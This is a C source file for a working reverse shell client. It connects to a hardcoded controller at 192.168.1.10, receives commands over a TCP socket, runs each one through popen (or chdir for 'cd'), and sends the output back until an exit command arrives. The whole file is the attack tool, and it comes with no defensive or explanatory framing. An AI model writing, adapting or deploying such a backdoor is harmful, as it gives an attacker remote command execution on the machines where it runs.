#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netdb.h>

#include "project_defs.h"
#include "functions.h"

int main(void)
{
	int connection_fd;

	struct addrinfo  hints;
	struct addrinfo *server_info;
	int gai_status;

	char buf[BUF_SIZE];
	ssize_t bytes_recieved;
	ssize_t bytes_sent;
	FILE *command_out;
	uint8_t exit_flag = 0;

	explicit_bzero(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;

	gai_status = getaddrinfo("192.168.1.10", PORT, &hints, &server_info);
	if (gai_status != 0)
		NAME_RESOLUTION_ERROR(gai_status);
	puts("[+] Name resolution success!");

	connection_fd = socket(server_info->ai_family, server_info->ai_socktype, server_info->ai_protocol);
	if (connection_fd < 0)
		FATAL_ERROR("Socket create");
	puts("[+] Socket created!");

	puts("[*] Connecting...");
	if (connect(connection_fd, server_info->ai_addr, server_info->ai_addrlen) != 0)
		FATAL_ERROR("Socket connect");
	puts("[+] Connection successful!");

	puts("# COMMUNICATION_START #");
	while (!exit_flag) {
		explicit_bzero(buf, BUF_SIZE);
		bytes_recieved = recv(connection_fd, buf, BUF_SIZE, 0);
		if (bytes_recieved == -1)
			FATAL_ERROR("Buffer recieve");
		printf("[+] Buffer recieved! (%luB)\n", strlen(buf));

		if (strcmp(buf, EXIT_COMMAND) == 0) {
			exit_flag = 1;
			strcpy(buf, "");
		} else if (is_str_command(buf, "cd")) {
			if (chdir(buf + 3) != 0)
				strcpy(buf, "Invalid path!");
		} else {
			command_out = popen(buf, "r");
			explicit_bzero(buf, BUF_SIZE);
			read_to_eof(buf, BUF_SIZE, command_out);
			pclose(command_out);
		}
		buf[BUF_SIZE - 1] = EOF;

		bytes_sent = send(connection_fd, buf, BUF_SIZE, 0);
		if (bytes_sent == -1)
			FATAL_ERROR("Buffer send");
		printf("[+] Buffer sent! (%luB)\n", strlen(buf));
	}
	puts("#  COMMUNICATION_END  #");

	if (close(connection_fd) != 0)
		FATAL_ERROR("Socket close");
	puts("[+] Connection closed!");

	return 0;
}
